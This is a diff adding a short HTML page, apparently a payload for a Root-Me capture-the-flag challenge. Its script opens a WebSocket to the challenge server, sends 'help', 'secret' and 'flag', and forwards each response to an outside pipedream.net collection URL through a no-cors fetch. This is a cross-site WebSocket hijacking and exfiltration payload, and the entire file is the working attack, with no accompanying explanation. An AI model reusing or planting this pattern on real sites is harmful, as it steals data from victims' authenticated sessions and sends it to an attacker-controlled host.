@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+<body>
+<script>
+const ws = new WebSocket("ws://ctf20.root-me.org/ws");
+
+ws.onopen = () => {
+  ws.send("help");
+  ws.send("secret");
+  ws.send("flag");
+};
+
+ws.onmessage = (e) => {
+  fetch("https://eo287p1od7gtso3.m.pipedream.net/?d=" + encodeURIComponent(e.data), {
+    mode: "no-cors"
+  });
+};
+</script>
+OK
+</body>
+</html>
